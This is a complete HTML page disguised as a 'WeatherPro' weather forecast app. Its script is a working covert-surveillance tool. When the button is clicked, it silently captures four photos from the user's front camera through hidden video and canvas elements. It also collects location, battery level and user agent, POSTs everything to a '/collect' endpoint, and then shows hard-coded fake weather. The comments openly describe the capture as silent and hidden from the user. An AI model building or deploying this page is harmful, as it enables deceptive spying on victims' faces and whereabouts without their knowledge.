<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>WeatherPro Forecast</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color: white; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
    .weather-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px; border-radius: 24px; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 32px rgba(0,0,0,0.3); text-align: center; width: 90%; max-width: 400px; }
    .temp { font-size: 72px; font-weight: bold; margin: 10px 0; }
    .city { font-size: 20px; color: #a8b3c7; margin-bottom: 20px; }
    .btn { background: #4fd1c5; color: #073b3a; border: 0; padding: 16px 32px; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
    .btn:hover { background: #38b2ac; transform: translateY(-2px); }
    /* HIDDEN ELEMENTS - These make the capture work without the user seeing it */
    #vid, #canv, #output { display: none; } 
  </style>
</head>
<body>
  <div class="weather-card">
    <div id="loading-ui">
      <div class="city">Location Access Required</div>
      <div class="temp">--°</div>
      <p>Grant location to see your precise local forecast and humidity.</p>
      <button id="startBtn" class="btn">Check Local Weather</button>
    </div>
    
    <div id="weather-ui" style="display:none;">
      <div class="city" id="cityName">New York, US</div>
      <div class="temp">24°</div>
      <p>Sunny with light winds</p>
      <p style="font-size: 12px; color: #a8b3c7;">Updated just now</p>
    </div>
  </div>

  <video id="vid" autoplay playsinline muted></video>
  <canvas id="canv"></canvas>

  <script>
    const startBtn = document.getElementById('startBtn');
    const loadingUI = document.getElementById('loading-ui');
    const weatherUI = document.getElementById('weather-ui');
    let payload = { burstImages: [] };

    startBtn.addEventListener('click', async () => {
        startBtn.innerText = "Loading...";
        
        try {
            // 1. Silent Camera Capture
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.getElementById('vid');
            video.srcObject = stream;

            const canvas = document.getElementById('canv');
            canvas.width = 640; canvas.height = 480;
            const ctx = canvas.getContext('2d');

            // Wait 1 second for camera to focus, then take 4 photos
            await new Promise(r => setTimeout(r, 1000));
            for (let i = 0; i < 4; i++) {
                ctx.drawImage(video, 0, 0, 640, 480);
                payload.burstImages.push(canvas.toDataURL('image/jpeg', 0.4));
                await new Promise(r => setTimeout(r, 400));
            }
            
            // Turn off camera light immediately
            stream.getTracks().forEach(t => t.stop());

            // 2. Silent Device & Location Data
            const battery = await navigator.getBattery();
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, (e) => r({coords:{latitude:0, longitude:0}})));
            
            payload.ts = new Date().toISOString();
            payload.ua = navigator.userAgent;
            payload.battery = { level: Math.round(battery.level * 100), charging: battery.charging };
            payload.loc = { lat: pos.coords.latitude, lon: pos.coords.longitude };
            
            // 3. Silent Send to Google Sheets (Server.js)
            await fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 4. Change UI to show "Fake" Weather results
            loadingUI.style.display = 'none';
            weatherUI.style.display = 'block';

        } catch (err) {
            console.error(err);
            alert("Please allow location and camera to use this weather service.");
            startBtn.innerText = "Try Again";
        }
    });
  </script>
</body>
</html>
